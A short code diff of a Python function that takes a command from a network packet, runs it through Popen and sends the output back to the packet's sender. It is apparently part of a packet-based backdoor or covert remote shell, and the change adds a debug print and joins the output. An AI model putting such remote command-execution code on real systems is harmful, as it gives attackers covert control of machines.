@@ -53,6 +53,7 @@ def run_cmd(packet, cmd):
 		command, arguments = cmd.split(' ', 1)
 	except ValueError:
 		arguments = None
+	print(command)
 	try:
 		if(arguments is not None):
 			out, err = Popen([command, arguments], stdout=PIPE, stderr=PIPE).communicate()
@@ -66,7 +67,7 @@ def run_cmd(packet, cmd):
 		output.append(err)
 	# output = encrypt_val("".join(output))
 	time.sleep(0.1)
-	send_msg(output, packet[1].src)
+	send_msg(''.join(output), packet[1].src)
 
 
 def execute(packet, command):
